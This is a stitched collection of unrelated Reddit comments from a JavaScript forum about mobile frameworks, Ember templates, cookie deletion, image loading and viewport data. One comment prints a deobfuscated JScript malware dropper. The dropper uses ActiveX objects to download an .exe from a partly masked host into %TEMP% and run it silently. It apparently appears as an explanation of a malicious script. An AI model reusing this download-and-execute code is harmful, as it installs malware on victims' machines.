You want React Native. It will be available soon.
It is a personal project of mine that I wanted to share with the community. Although the app itself is not directly related to JS the demos it showcases are all using the Web Audio API, WebGl, Canvas and other JavaScript libraries and APIs. Please let me know which of the guidelines I did not follow. Thanks!
http://www.appcelerator.com/titanium/ http://cordova.apache.org/
Or just use Titanium wich has been out for years
The design flow should be that the programmer imports the file from source and formats it to their preference, does their work on it and then formats it back to the project formatting style on export. But I think what I want most is a lint that will catch performance problems and potentially buggy code, not nitpicking over how the spacing or shape of the code that ultimately does not matter to the compiler. That's just wasting time. JSHint seems to do this very well.
options: - easy way: duplicate modules for front and backend; e.g. have both bower and npm versions of underscore. - harder, but ultimately more satisfying way: replace RequireJS with Browserify or Webpack. I've switched a fairly large app to webpack and I found it easier to rewrite the config for webpack rather than modify the requireJS config to deal with node_modules. Here's [Pete Hunt's quickstart guide for webpack](https://github.com/petehunt/webpack-howto).
Haha nice! 
Every time I see questions like this I die a little inside.
I'm not on my computer to verify, but it should be able to make AJAX requests to servers that support [CORS](http://en.m.wikipedia.org/wiki/Cross-origin_resource_sharing).
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Cross-origin resource sharing**](https://en.wikipedia.org/wiki/Cross-origin%20resource%20sharing): [](#sfw) --- &gt; &gt;__Cross-origin resource sharing__ (__CORS__) is a mechanism that allows many resources (e.g. fonts, JavaScript, etc.) on a [web page](https://en.wikipedia.org/wiki/Web_page) to be requested from another [domain](https://en.wikipedia.org/wiki/Domain_name) outside the domain from which the resource originated. &gt;A web page may freely embed images, [stylesheets](https://en.wikipedia.org/wiki/Stylesheets), scripts, [iframes](https://en.wikipedia.org/wiki/Iframes), videos and some plugin content (such as [Adobe Flash](https://en.wikipedia.org/wiki/Adobe_Flash)) from any other domain. However embedded [web fonts](https://en.wikipedia.org/wiki/Web_fonts) and [AJAX](https://en.wikipedia.org/wiki/AJAX) ([XMLHttpRequest](https://en.wikipedia.org/wiki/XMLHttpRequest)) requests have traditionally been limited to accessing the same domain as the parent web page (as per the [same-origin security policy](https://en.wikipedia.org/wiki/Same-origin_policy)). "Cross-domain" AJAX requests are forbidden by default because of their ability to perform advanced requests (POST, PUT, DELETE and other types of [HTTP requests](https://en.wikipedia.org/wiki/HTTP_request), along with specifying custom [HTTP headers](https://en.wikipedia.org/wiki/HTTP_headers)) that introduce many security issues as described in [cross-site scripting](https://en.wikipedia.org/wiki/Cross-site_scripting). &gt;CORS defines a way in which a browser and server can interact to safely determine whether or not to allow the cross-origin request. It allows for more freedom and functionality than purely same-origin requests, but is more secure than simply allowing all cross-origin requests. It is a [recommended standard of the W3C](http://www.w3.org/TR/cors/). &gt; --- ^Interesting: [^Same-origin ^policy](https://en.wikipedia.org/wiki/Same-origin_policy) ^| [^XMLHttpRequest](https://en.wikipedia.org/wiki/XMLHttpRequest) ^| [^Internet ^Explorer ^10](https://en.wikipedia.org/wiki/Internet_Explorer_10) ^| [^Web ^Messaging](https://en.wikipedia.org/wiki/Web_Messaging) ^Parent ^commenter ^can [^toggle ^NSFW](/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cof3coy) ^or[](#or) [^delete](/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cof3coy)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
I don't see why. Can you elaborate? We can clearly see that developing an app on several platforms is a real struggle, reason why things like React Native, Titanium, Phonegapp, etc. have been hyped so much. Asking for a shared "language" seems a fair question. 
the mouseover text for images is done via html: you can add a title="Text here" tag to the img ex: &lt;img src="asdf.png" title="text here"&gt; your best bet is to jump on irc in #jquery and ask this questions they will be able to answer any question in like 15 seconds. alternately if you want do it with html a common way: &lt; img src="mypic.png &gt; &lt; div class="a" style="display:none" &gt; allo &lt; /div&gt; &lt; script src=jquery.min.js &gt;&lt; /script&gt; &lt; script &gt; $(function () { $( "img" ).hover( function() { $( '.a' ).show(); }, function() { $( '.a' ).hide(); }) }) &lt; /script&gt;
He may have to do it in pure JavaScript and not use any frameworks... If that's the case you can look at how jQuery handles hover events and the code above and write that in JavaScript
 &lt; img src="mypic.png" onmouseover="document.getElementById('txt').hidden = false;" onmouseout="document.getElementById('txt').hidden = true;"&gt;&lt; div id="txt" hidden&gt;text here&lt; /div&gt; was bored =] cheers
Yeah, meant to say that it isn't a real _code_ editor...
Thank you.
Coming Soon^^TM. 
Yes, please do downvote my comment! Keep the competition working extra hard!
JavaScript programming, decent performance, large community.
It's not possible at the moment using the current releases. It would be a good project to build a node runtime that can power Android and iOS apps, it's not something I plan on taking on though.
For android there is SL4a (scritping language for Android), it gives you many choices for behind the scenes languages (including javascript, most people use python, I use beanshell(java) because it has no restrictions), and opens your user facing html/javascript in a browser with callbacks to your backend code. https://code.google.com/p/android-scripting/wiki/FAQ Don't really know or care about IOS, apple goes out of its way to make developers miserable, even if you aren't coding an apple application. 
`xdg-open` is for Linux. On OSX the command is `open`.
Great, http://github.com/kangax/fabric.js seems to fit them all. Although no semver yet, but soon.
I use 6to5 to transpire and Uglify to minify. Is that what you meant?
This is stupid and outdated. Use CSS :hover instead.
Yeah, Fabric.js is a great example!
Or phonegap. If your app just needs CRUD operations then you can do it in basically a mobile website wrapped up in an app. Unless you have a whole lot of time if you need to do a multi platform app this is the way to go. Titanium studio is OK too , the only downside with this is you won't be able to showcase your apos as being proof of any native app development skill. How much this matters is up to you. Also you have various tools like Parse that can handle all that CRUD stuff for you. ( if you want to really take some shortcuts go ahead and combine Titanium and Parse ( although Titanium has built in crud stuff to their severs ). 
[Image](http://imgs.xkcd.com/comics/self_description.png) **Title:** Self-Description **Title-text:** The contents of any one panel are dependent on the contents of every panel including itself. The graph of panel dependencies is complete and bidirectional, and each node has a loop. The mouseover text has two hundred and forty-two characters. [Comic Explanation](http://www.explainxkcd.com/wiki/index.php/688#Explanation) **Stats:** This comic has been referenced 48 times, representing 0.0941% of referenced xkcds. --- ^[xkcd.com](http://www.xkcd.com) ^| ^[xkcd sub](http://www.reddit.com/r/xkcd/) ^| ^[Problems/Bugs?](http://www.reddit.com/r/xkcd_transcriber/) ^| ^[Statistics](http://xkcdref.info/statistics/) ^| ^[Stop Replying](http://reddit.com/message/compose/?to=xkcd_transcriber&amp;subject=ignore%20me&amp;message=ignore%20me) ^| ^[Delete](http://reddit.com/message/compose/?to=xkcd_transcriber&amp;subject=delete&amp;message=delete%20t1_cofdwma)
**Update** Thanks for the advice guys! I finally figured it out. you were right though, it was purely html based. I ended up doing it this way putting both the image and the text in &lt;table&gt; and was able to do this: &lt;td id='outputTD'&gt; and then subsequently onmmouseover and leaving onmouseout blank worked. Sorry If I didn't post this in the right place. I am as green as it gets to coding haha
You need to be more specific. If you mean a tag as in something like `&lt;a&gt;`, you can do that as long as it's a string, e.g. var html = '&lt;p&gt;stuff&lt;br&gt;'; You certainly can't just plop down a random tag in the middle of a function, though: var this_is_nonsense = &lt;p&gt;stuff&lt;br&gt;; If you ever want that markup to become actual DOM, that generally means you'll be using something that converts strings to DOM elements, like `innerHTML`. 
Hi /u/aharris88, it looks like you're new to /r/javascript, welcome! Thanks for the submissions, but please make sure you read our [guidelines](http://www.reddit.com/r/javascript/wiki/index). In short, you should post from a variety of sources, and not just `adamwadeharris.com`. Thanks for your consideration! domain submitted from|count|% :-|-:|-: [adamwadeharris.com](/search?q=%28and+site%3A%27adamwadeharris.com%27+author%3A%27aharris88%27+is_self%3A0+%29&amp;restrict_sr=off&amp;sort=new)|8|67%
Hi /u/bjpelcdev, it looks like you're new to /r/javascript, welcome! Thanks for the submissions, but please make sure you read our [guidelines](http://www.reddit.com/r/javascript/wiki/index). In short, you should post from a variety of sources, and not just `bjpelc.wordpress.com`. Thanks for your consideration! domain submitted from|count|% :-|-:|-: [bjpelc.wordpress.com](/search?q=%28and+site%3A%27bjpelc.wordpress.com%27+author%3A%27bjpelcdev%27+is_self%3A0+%29&amp;restrict_sr=off&amp;sort=new)|12|60%
It means that many thousands of developers have already solved the majority of the problems you will face in efficiently serving data to a client in such a way that its not visually awful to the end user or make your server team want to shoot you. Plus, that gives you a larger pool of developers to tap when/if you need to expand the development team. Doing it in JS doesn't magically solve a problem which has not been solved already in multiple other languages. While there may be a few edge cases where an 100% JS solution is ideal (cant think of any), 99% of the time its going to be overkill and more balanced and traditional solution will be better in the long run. 
What do you mean crazy crap it did with script tags? Do you mean Handlebars?
I'm assuming /u/SpiceFinger means the live binding script tag insertions with metamorph. It would inject script tags around bound values. [Here's the documentation about it.](http://emberjs.com/guides/understanding-ember/keeping-templates-up-to-date/)
replace the aum() function content with {console.log(o7)} and you will get this code: function dl(fr, fn, rn) { var ws = new ActiveXObject("WScript.Shell"); var fn = ws.Expand******Environment*******Strings("%TEMP%") + String.fromCharCode(92) + fn; var xo = new ActiveXObject("MSXML2.XMLHTTP"); xo.onreadystatechange = function() { if (xo.readyState === 4) { var xa = new ActiveXObject("ADODB.Stream"); xa.open(); xa.type = 1; xa.write(xo.ResponseBody); xa.position = 0; xa.saveToFile(fn, 2); xa.close(); }; }; try { xo.open("GET", fr, false); xo.send(); if (rn &gt; 0) { ws.Run(fn, 0, 0); }; } catch (er) {}; }; dl("http://ga**********ias.com/document.php?id=5452575E09*****************309050D084A070B09&amp;rnd=2419841", "19388542.exe", 1); 
Thank you! I didn't know that I had to include everything as a string for innerHTML to work
`&lt;script&gt;` tag-based metamorphs have been actually been gone since Ember 1.8, released in October :-)
I'm going to guess it's [this sublime package](https://github.com/spadgos/sublime-jsdocs)
Added Common Development and Distribution License 1.0 (CDDL-1.0), Common Public Attribution License 1.0 (CPAL-1.0), CUA Office Public License Version 1.0 (CUA-OPL-1.0), EU DataGrid Software License (EUDatagrid) licenses.
As mentioned in the other thread, [this demo](http://danielstjules.github.io/blankshield/) helps demonstrate the phishing attack and put things in context.
Is titanium literally just a javascript API over the native widgets? Biggest draw to react native isn't the layering IMO
When has it ever been beneficial to literally put an application server onto a mobile device? 
You are making an assumption about what node would be used for on a mobile device. Running node as a server on a mobile was not the use case I was thinking of - I was thinking of using it as the run-time for a more conventional mobile client app. Running a server on a mobile would certainly be an interesting experiment though! I can't think of any examples of app servers being on mobile devices to date (except maybe proxy servers).
why would you want to run node on a handset? it makes no sense. Node is a runtime for webapps, if you're goal is using javascript to write native apps use either titanium or phonegap. 
no he wants either titanium or phonegap,which are available right now.
it is exactly that.You write javascript but your UI isn't a webpage like phonegap,it IS native iOs and native android.
He said he wants to build a native app. I took him at his word that he didn't mean a hybrid app.
Homoiconic is not the author of the article. In addition, the article explains how to turn ordinary numbers into iterators. Presumably you hit this wall and stopped reading?
Also, there would be uses for running application servers on mobiles, but it takes some imagination to think of them.
I'm been working with Angular for some time now and I found that Ember was so much easier to work with from the start. The support on Freenode was lacking at the time, but after fiddling with the code and reviewing the documentation for a couple hours, everything seemed to fall into place and become clear. The only confusing aspect was the side-loaded JSON, but once I saw what Ember was doing it became so understandable that it was hard to look back. Angular does so many magical things that even a professional developer has to shrug his shoulders and say "I dunno, it's magic." But Ember was a lot more understandable, even with its magic. The only thing I didn't like was the &lt;script&gt; tag templates.
I'm not talking about installing node. I'm talking about using software that compiles your js code into native code.
Just curious, what do you feel is so magical about Angular? What do you think makes Ember so much more understandable?
I love using keyboard shortcuts and recently I've been getting myself used to doing `Ctrl + Click` to open new tabs instead of my usual `RightClick -&gt; Open in New Tab`. I don't think I'll be doing that anymore. In Chrome the 'Open in New Tab' is not vulnerable, but `Ctrl + Click` *is* (as your chart shows). This is really good to know. Also focus is kept on the original window so I was able to see the 'phishing page' load, which is good too.
Look into event listening, event keys, and window's scrollTop attribute
&gt; Less variation in the speed of the runtimes - the JavaScript engine would be bundled with the app, android and ios already have javascript runtimes that are accessible,that's how titanium works and you don't need nodejs for that. Therefore bundling nodejs with a native app makes absolutely no sense. &gt; meaning differences in the OS would not change the app's speed nearly as much. Well you'd have to compile nodejs for these handset anyway,different architectures, different performances.What you say makes no sense at all.
titanium apps are not hybrid apps, they are native apps. Furthermore I don't see how installing nodejs on a device will help develop native apps. His question and your answer make no sense at all,since nodejs is a javascript runtime.
The main reason, which I stated, is to run a client-side app. The JavaScript runtime's capabilities would be constant amongst the installations of the same version of the app, so that is one reason. Does none of what I am saying make any sense to you?
&gt; Also, there would be uses for running application servers on mobiles, but it takes some imagination to think of them. You don't need it one android and you can't do that on iOs. On android you can run an intent as a background service. there is absolutely no need to run a server with the intent architecture of android.
i see.
No, specifically for building native apps, there would be consistent runtime, which would be advantageous. This is in line with the question. The question was asking if this can be done, the answer is that it would be difficult to do, but we have been discussing an issue related to the original question. It's not to unrelated to go from 'can this to be done' to 'is this pointless or not', and that's a topic you are engaging is. My take is that it would not be pointless, and I have explained why, I hope to your satisfaction now. Do you at least understand that there are advantages to be had by deploying a consistent and possibly faster runtime? Do understand what I was getting at, are you now able to understand what I have been saying?
Lessening performance variation - do you see how it could be an advantage. My point is there would not be performance variations caused by differences in the version of the JavaScript runtime. I'm not disputing that there would not be any performance differences (how on earth could that be done with any software tech anyway?)
Only one I can think of that has it on its roadmap is Tint; but its not even passing most unit tests yet.
Same story here. Have been using Angular for BitBalloon, Netlify and other projects. I'm working on an important project we'll be open-sourcing and actually had the first prototype working in Angular. However, the AngularJS 2.0 roadmap pretty much just killed Angular 1.x, and it's way to early in the 2.0 development to launch a project based on that. So I rewrote the whole thing in Ember. I would say the Ember version is a bit more verbose, but the API is cleaner and it didn't have any of the performance issues we did run into with the Angular prototype.
The comment is well posed. The response il priceless!
Since I found out that [normal promises actually can work inside transactions](http://stackoverflow.com/a/28392484) I've been thinking about a better approach than sync promises (it sounds like you know about this stuff, please consider fact checking that SO answer). Providing a flush operation is a really great solution! It could be made to work even in IE if the user remembers to flush in his IndexedDB event handlers. I think I'll grow SyncPromise Promises/A+ compliant and add a flush operation. That whould be ideal for [SyncedDB](https://github.com/paldepind/synceddb).
See if this is of any help, certainly helped in my case: http://www.html5canvastutorials.com/tutorials/html5-canvas-image-loader/
Sounds like someone introduced some bad javascript and the click event is no longer working correctly. Any chance you could include the URL to the website so I could take a look in the debugger?
ok that is excellent feedback. You have provided great optimization opportunities for Radiant MediaLyzer. I am going to implement this now. The pull request is a bit dense so I am going to implement it by phase to be sure it tests well. Thanks Edit: your additions can be found in 1.2.1
Most of the work is just JSON, string manipulation and web browser emulation so C++ isn't the best match and JavaScript rocks at both of those things.
Thanks for the recommendation.
Thanks for the recommendation I'll keep it on my radar.
[atom.io](https://atom.io/) a text editor is a node app, [komanda](https://github.com/mephux/komanda) is a node app. Node has plenty of command line utilities now grunt, Facebook flow and many many more. Node is not just a web server any-more.
Wouldn't it have been better to compare Dokku (-which is based on Docker) with Heroku ?
Super creepy. Isn't there a /r/helpmehackpornhub subredit?
WOW, ELSE BLOCKS! This changes everything! Why people insist on programming their interfaces in these crippled pidgin languages is beyond me.
That's awesome (your [other post](http://raganwald.com/2013/03/29/high-level-trampolining.html) on the subject is particularly relevant), and definitely good enough for this purpose.
You don't erase cookies that way. What you have to do is set them to an empty value and an expiry date in the past. But you need to do that for each cookie you want to delete: document.cookie = 'nameofthecookie=;expires=Thu, 01 Jan 1970 00:00:01 GMT;' Or you could just search for [javascript delete cookie](https://duckduckgo.com/?q=javascript+delete+cookie&amp;ia=qa).
&gt; Loading the image is an async operation, you need to make sure it has been loaded before executing the rest of the game Well, that's kind of what i'm checking inthe onload event added onto the image.. However, I suppose the program doesn't care if it's loaded or not. How silly of me. 
I tend to disagree with your sentiment about "crippled pidgin languages" as I think small template engines make the templates much more readable, but Ember's handlebars implementation is extremely lacking IMO. This are some nice changes, but when could I finally use statements in if blocks for example? {{#if user.role == 'admin' }} // show a link to the admin panel. {{/if}} Makes so much more sense then {{#if user.isAdmin}} // {{/if}} and then having to define a property of isAdmin on the model: ... isAdmin: function () { return this.get('role') == 'admin'; }.property('role'), ... This really annoys me every single time. Adds unnecessary methods to the model/controller for something as simple as an if this then that. There are some solutions to this, but they are very ugly. For example I've seen people making a custom component and call it like this: {{#if-eq param1=user.role param2="admin"}} {{/if}} and then for "else" there is another component: {{#if-not-eq... This is really not that difficiult problem to tackle. And "not the ember way" is really not a good reason for something as fundamental as this. EDIT: Just look at [this](http://stackoverflow.com/questions/11169595/check-for-a-value-equals-to-in-ember-handlebar-if-block-helper). Why??
Makes me want to go back to the 'Bioinformatics Algorithms' course on coursera. One of the more interesting ones in there. 
It killed the excitement to be more precise, and it also made "Angular Sucks!!!!" articles the trendy thing to write.
misleading title. more about Canvas than the DOM
No, sorry. &gt; With the FileSystem API, a web app can create, read, navigate, and write to a **sandboxed section** of the user's local file system. ------- &gt; In April 2014, it was announced on public-webapps that the Filesystem API spec is not being considered by other browsers. For now, the API is Chrome-specific and it's unlikely to be implemented by other browsers and is no longer being standardized with the W3C. via [html5rocks.com Exploring the FileSystem APIs](http://www.html5rocks.com/en/tutorials/file/filesystem/)
i am using Google Polymer for my SPAs, its based on web components, easy to learn and awesome. SPA Sample: https://www.polymer-project.org/articles/spa.html Quiz Sample: https://polymer-topeka.appspot.com/
You won't be able to remove all cookies. HttpOnly cookies are not modifiable by JavaScript. 
Async means that, while the image won't be available until it is loaded, the rest of the code keeps running. in your case this means it runs your new Sprite(...) statement without any delay and without caring if your image is done loading or not. The onload is then called some time after that. You will need to put the code you would like to run once the loading is finished into the onload callback of the image. so in the Game.js something like this: var run = function () { context.clearRect(0, 0, canvas.width, canvas.height); this.draw(); this.update(); requestAnimationFrame(run); }.bind(this); var coin; var images = new ImageLoader('sprite.png',function(){ coin = new Sprite(context, 0, 0, 100, 100, 0, 0, 100, 100, images.getImage()); coin.draw(); run(); }); and in the ImageLoader: function ImageLoader(_src, onload){ this.image = new Image(); this.image.onload = onload; ...
Yes, I know that accessing an arbitrary item in a linked list is On while accessing an arbitrary item in a vector is done in constant time regardless of the language. We're having this same conversation over and over again. I think I'm saying *A*, you reply "You said *B*, and here is why that shows that you don't understand *A*." As I noted earlier, that is helpful to me in that it suggests ways to improve the clarity of the post to reduce the possibility of readers thinking it says *B* when I intend it to say *A*. So once again, thank you for speaking up.
Frameworks help with some things, but they bring in a bunch of complexity as well. So I'd say don't use a framework until you know you need it and why you need it. I've worked with a bunch of frameworks, and they all have their sweet spots but they're no silver bullets. You're better off really understanding Javascript and the DOM before you start with frameworks because by then you know what the framework gives you, and what you give up by using one. And that information lets you make a better decision.
Handlebars syntax is very limited by design, no doubt. The benefits are that templates are easy to read, don't contain JavaScript (good for non-technical contributors), and the limited flexibility opens a door for rich analysis during compilation. Rich static analysis means we can create nice, HTML-aware APIs and get great performance. HTMLBars know what parts of your template are dynamic, and what parts are static. Yehuda has been spiking on some big changes to the HTMLBars templates over the last week, changes that introduce an approach to rendering much more like "dom-diffing" than we have today. But testing equality still sucks a bit. The current best approach is this library of nested helpers: * https://github.com/jmurphyau/ember-truth-helpers {{#if (eq user.role 'admin')}} Hello Space Admin! {{/if}} They can be nested at arbitrary depths. Check it out.
I don't know about "better", but I see your point. However, Dokku says, on the Github page, that it is a *"Docker powered mini-Heroku"*. I think with Docker at the core of Dokku, it makes sense to compare Docker to Heroku. However, a great follow up might be something that explains what parts of Dokku make it a "mini-Heroku" and the benefits of that over just using Heroku... **Note** - I am not the author of the article, I just shared it and found it valuable
&gt; I found a solution By which you mean you posted to /r/javascript because you were too lazy to even try one google search for the answer, the [first responder](http://www.reddit.com/r/javascript/comments/2vafdu/how_to_remove_cookies_with_javascript/cofvqpz) helpfully linked you to the [DuckDuckGo results page](https://duckduckgo.com/?q=javascript+delete+cookie&amp;ia=qa) you should have found yourself while expending the minimum effort required to answer your own question, and you read the very first link and cut and pasted some code from it. Don't get me wrong - you're positively encouraged to try to find your own answers on Google and there's nothing wrong with using StackOverflow to find a quick snippet of code that does what you want (assuming you understand how/why it works)... but the frankly astonishing level of laziness (or if we're being kind, "misdirected effort") you've demonstrated here doesn't bode well for your future success as a developer.
Just a reminder: not everyone who comes here looking for help is - or intends to become - a developer. Lots of people are just looking for a bit of help when this is *not* their fulltime job, and they aren't planning on changing that. A little courtesy goes a long way.
First thing I ask for apologize. I am a beginner and I was lost. There are many things that I didn't know and I have learned through this post by trial and error and by the clues the people gave me here. The post in Stack overflow didn't say how to get the Path, domain of a Http only cookie and I ever didn't know that it exists. Second I am not a Web Developer, I am learning Javascript to inject it where I want and control what the browser does, some exploratory programming. Third the post is the SO didn't show any real example of how to use it. So thanks everybody.
I recently wrote a similar SPA using React + Flux. The learning curve on React is pretty low, but the Flux pattern takes some time to get used to (at least it did for me). I agree with /u/billybolero in that you'll probably add some complexity into your workflow going this route. I had to have some specific npm modules and then bundle everything with browserify, etc. So you do trade in some simplicity but if your app starts to grow the code becomes much easier to maintain.
Thanks
Would any of you framework gurus like to help fill in facts about them in the following spreadsheet? Send me a request and I'll give you editor permission. This will help save many many hours of research by everyone who needs to understand the trade-offs https://docs.google.com/spreadsheets/d/1r8rJy2Q5p5QORYKcye93UECwOlSgFL24c5fyF7dqhaM/edit#gid=1607194899
the fact that many 3rd party plugins don't parse CS, and you are therefore obliged to jump through hoops to get a decent build chain together
Is the ember-cli updated to htmlbars ? I fell in love with the cli and honestly don't want to go back.
 https://react-bootstrap.github.io/
It looks like it's the default styling for the UL provided by bootstrap. @media screen { ol, ul { padding:0; margin:0 0 9px 25px } } Without the margin-left 25px everything looks fine. If you add, .entry-slider ul { margin-left: 0; } It works fine.
Note that the second example would be well-formed JSX, though. But the semantics would be entirely different.
It looks like ember-cli currently uses ember 1.8.1.
It doesn't look like it needs to be using an array. It also looks like it's using myArrayList as input, so let's clean it up: function doFactFunction(input) { if (input == 0 || input == 1) { return 1; } var outcome = input; while (input &gt; 1) { outcome = outcome * (input - 1); input = input - 1; } return outcome; } 
I was referring to how every article about it has a sentence like: &gt; React’s true strengths: composition, unidirectional data flow, freedom from DSLs, explicit mutation and static mental model. Which, to me, comes out as some kinda shit marketing talk.
No my friend, I feel you you completely missed the point. Its nice *you* don't like php, but you fail to explain why php or any other solution which has been around for years is inferior to JS. Just because *you* dont like PHP, it doesn't automatically make it a bad solution. PHP is easy to learn, easy to use, easy to scale, easy to setup, there lots of resources out there to help you make the most of it, and lots of devs can sit down and work with it without needing much help. These are important things to consider when starting up a new project, site, or application. You also say that "many" sites use this solution but fail to provide examples. Who uses it? how many users can they actually support? Can/do they scale? Does their server team actually like the solution? I honestly would like to see a GOOD example of this. The original article even touches on the fact that Twitter moved back towards a traditional client/server model because *it was better for the end user*. There is an important lesson there. What is good for the user may not always be good for the devs, but we gotta suck it up because we make software for *users* not ourselves. Remember, the right tool for the job isn't always the shiny new tool. Often its the old dirty greasy one because its tried to true and gets the job done quickly and cheaply without any unexpected BS. I am going to leave you with this article which everyone should read as i think it nails my point better than i do. https://medium.com/@codepo8/the-web-application-myth-69c6b1506515 
Adjusting a number by a percentage can be done by multiplying that number by `1 + percentage/100` (in this case `percentage/100` is `0.0005`). So we need a multiplication operator, which Javascript has: `*`. To increase a number by `0.05%` would be `number = number * 1.0005`. To decrease it would be `number = number * 0.9995` 
i missed that. Thanks.
Pete Hunt is in the house, ladies and gentlemen! :D OP, how experienced are you with js? React might be right up your alley if you have had some exposure to js :)
Not exactly what you want but may be interesting for you: http://stackoverflow.com/questions/18690450/saving-a-file-with-javascript
 &lt;td colspan="3" align="center" height="150"&gt; &lt;font size="5"&gt;$&lt;/font&gt; &lt;input name="bet" size="5" value="100" onfocus="if ( this.value == 0 ) this.value = '';" type="text"&gt; &lt;br&gt; &lt;input value="Pull Handle" type="submit"&gt; &lt;input name="i" value="1eccbc87e4b5ce2fe28308fd9f2a7baf3" type="hidden"&gt; &lt;/td&gt; Something like that? What more do you need.
this would be great for /r/web_design and /r/webdev too
My JavaScript experience is limited to a codeacademy tutorial or two. I am somewhat proficient in Python, and have had some exposure to emacs and lisp, which is where my desire to do this in a more functional style comes from. I want to avoid html as much as possible, because I don't see why that same information can't just be represented in native js. I'm not some veteran web developer that is accustomed to working with html for a zillion years, so I have no attachment to it, and would rather just stick to a single tool.
Clever
1. "steal money" is about the equivalent of monopoly money here. 2. I am more familiar behind the concepts of trying to protect my PHP code from SQL injection and am just interested in the security all around. 3. Get Bent.
&gt; filenames need to be the same name as controllers at times (causes weird bugs in some cases) wat. That sounds like it may be more of a problem with your build process. Angular (like any FE JS lib) doesn't take into account the filename.
My gut reaction is that you're about to create a horrible abomination, but on the off chance that you're some brilliant genius that makes some magic framework that makes all our lives better, I say go for it!
Would be cool to have a heatmap-style to show the popularity of viewports. Imagine the animation over time once you had some historical data.
My drill motor is excellent at turning screws and boring holes, but really sucks if you have to hammer in a nail.
True, it would defeat the purpose of that site. But I think one of the primary challenges for a web dev is to know when and where to say "that's good enough then" when that time inevitably comes. Having some data usually helps. 
You're still going to end up with HTML and CSS no matter what. You can't display anything in a browser without those unless you're talking about making an entire app within a canvas element or something similarly crazy.
Debugger, debugger, debugger. There is no other easy way to reason about how an element might appear unless it's the child of an element with an ID, in which case grepping the ID might perhaps point you in the right direction.
I'd like to see something done for the width of the viewport as well.
I have not used it, but personally, I would encourage you to first exhaust all of the freely available resources. We have some good starting points for you in our [current sticky](http://www.reddit.com/r/javascript/comments/2upyol/learning_js_feedback_or_questions_about_the_sub/), and you could also search the sub for "free book", as there have been several that have received praise.
I think it's worth it if you're brand new to JavaScript or programming in general. The videos tend to go really slow so you might find it irritating if you're experienced
I didn't know what to call it. Is there a way to rename the post?
i'm not new to programming, and i know the js basics. The blogs i've read said that codecademy and treehouse tended to be more beginner oriented and codeschool more intermediate oriented so i thought this wouldn't happen. Thx for you feedback
If you want to get lisp in your javascript, check out Clojurescript. If you want your code to mirror your data, might as well use a lisp dialect. You're still gonna need an index.html in the end that bootstraps everything, however.
&gt; This is meant to show the diversity of viewports, not the popularity of them. While I find the data interesting, this sentence invalidates any meaningful parsing of it. According to this, 1 million unique visitors could have had 100 different viewport heights. 99 of them weird, and 999,901 of them to be exactly the same. Are you advocating that web design take into account the **.00009901%**? It's not the diversity that matters -- it is the *popularity*. 
I'm not saying I agree with them, but according to the blog post, they said "there is no such thing as a common page fold". I think they mean that there isn't some magic number that you can know where the fold will be for most people. But you're right, I'd rather analyze the data.
another thing people don't realize is not everyone browses at full screen.
If this is in bad form, my apologies: &lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt; &lt;html class=" js flexbox canvas no-touch geolocation hashchange history d…dients csstransitions fontface generatedcontent localstorage" xmlns="http://www.w3.org/1999/xhtml" style=""&gt; &lt;head&gt;&lt;/head&gt; &lt;body id="nd_vms_position_manager" class="firefox member member-article-01 arc hassidebar init-csstransitions"&gt; &lt;div id="cboxOverlay" style="display: none;"&gt;&lt;/div&gt; &lt;div id="colorbox" class="" style="padding-bottom: 0px; padding-right: 0px; display: none;"&gt;&lt;/div&gt; &lt;div id="dcheetaheditor" class="moveme"&gt;&lt;/div&gt; &lt;meta content="app-id=896767062" name="apple-itunes-app"&gt;&lt;/meta&gt; &lt;meta content="app-id=org.redcross.volunteerconnection" name="google-play-app"&gt;&lt;/meta&gt; &lt;link media="screen" type="text/css" href="/editor/mod.vms/mod.app-banner/jquery.smartbanner.css" rel="stylesheet"&gt;&lt;/link&gt; &lt;script src="/ama/mod.site/jquery.smartbanner.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt;&lt;/script&gt; &lt;link type="text/css" href="/editor/components/dhtmlwindow/windowfiles/dhtmlwindow.css" rel="stylesheet"&gt;&lt;/link&gt; &lt;script src="/editor/components/dhtmlwindow/windowfiles/dhtmlwindow.js" type="text/javascript"&gt;&lt;/script&gt; &lt;div id="dhtmlwindowholder"&gt;&lt;/div&gt; &lt;div id="page"&gt; &lt;div id="layout"&gt; &lt;div id="header"&gt;&lt;/div&gt; &lt;!-- PRIMARY NAV --&gt; &lt;nav id="primary_nav" class="member_nav"&gt;&lt;/nav&gt; &lt;div id="content" style="min-height: 1027px;"&gt; &lt;!-- CENTER COLUMN --&gt; &lt;div class="wrapper"&gt; &lt;a id="sidebar-trigger"&gt;&lt;/a&gt; &lt;div class="sidebar sidebar-fixed"&gt;&lt;/div&gt; &lt;div id="container"&gt;&lt;/div&gt; &lt;script type="text/javascript"&gt;&lt;/script&gt; &lt;script src="/editor/mod.vms/mod.admin/mod.position_manager/position_manager.js" type="text/javascript"&gt;&lt;/script&gt; &lt;h2&gt;&lt;/h2&gt; &lt;form id="search_form" style="margin:0;padding:0"&gt;&lt;/form&gt; &lt;div class="block noborder"&gt; &lt;div class="block_tabs"&gt;&lt;/div&gt; &lt;div class="block_body hastable"&gt; ::before &lt;table id="positions_table" class="alternating_rows groups"&gt; &lt;tbody&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt; &lt;td class="placement_name"&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt; &lt;a class="count_link" data-qtype="Current" data-placement_id="41941" href="#"&gt;&lt;/a&gt; &lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td class="actions" nowrap="nowrap"&gt;&lt;/td&gt; 